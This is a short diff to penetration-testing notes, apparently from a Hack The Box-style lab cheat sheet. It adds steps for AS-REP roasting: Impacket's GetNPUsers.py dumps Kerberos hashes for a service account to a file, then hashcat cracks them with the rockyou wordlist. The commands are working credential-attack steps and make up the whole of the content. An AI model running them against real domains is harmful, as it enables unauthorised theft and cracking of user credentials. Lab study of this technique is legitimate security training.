@@ -217,7 +217,11 @@ https://github.com/swisskyrepo/PayloadsAllTheThings/blob/f6d5221a8576125a07f42e0
 ```
 If you have a service account username but no passowrd and the user does not have pre-authentication enabled (unlikely in real world but possible for some services) an AS-REP roast can be performed.
 ```
-python GetNPUsers.py htb.local/svc-name -dc-ip 10.10.10.10
+python GetNPUsers.py htb.local/svc-name -dc-ip 10.10.10.10 >> asrep.hashes
+
+Clean up file then
+
+hashcat -m 18200 --force -a 0 asrep.hashes /usr/share/wordlists/rockyou.txt
 ```
 
 
